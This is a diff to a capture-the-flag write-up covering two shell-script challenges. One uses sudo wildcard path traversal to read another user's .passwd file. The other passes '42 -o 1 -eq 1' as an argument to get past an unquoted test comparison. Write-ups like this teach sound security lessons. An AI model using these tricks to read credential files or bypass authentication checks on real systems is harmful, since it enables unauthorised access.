@@ -18,7 +18,7 @@ sudo -u $user $commande
 
 dans le cas de cette exercice:
 
-'''bash 
+```bash 
 $ sudo -l
 User app-script-ch1 may run the following commands on challenge02:
     (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/notes/*
@@ -26,21 +26,21 @@ User app-script-ch1 may run the following commands on challenge02:
 $ sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/*
 
 $ sudo -u app-script-ch1-cracked cat /challenge/app-script/ch1/notes/../ch1cracked/.passwd
-'''
+```
 
 ### Unquoted variables
 
 Solution
 
-'''
+```
 ./wrapper "42 -o 1 -eq 1" 
-'''
+````
 
 Explanation
 This condition needs to be passed (line 18):
-'''
+````
 if test $PASS -eq ${1}; then
-'''
+````
 
 Note that `${1}` is unquoted!
 Hence, it will be "split" before being passed to the `test` command.
@@ -50,9 +50,9 @@ So, we need:
 Something that is an integer to make a valid comparison to $PASS;
 A condition that is always true: `1 -eq 1`.
 And the condition will be split to become:
-'''
+````
 $PASS -eq 42 -o 1 -eq 1
-'''
+````
 
 Sources
 Split/Glob effect on unquoted variables: https://unix.stackexchange.com/questions/171346/security-implications-of-forgetting-to-quote-a-variable-in-bash-posix-shells#answer-171347;
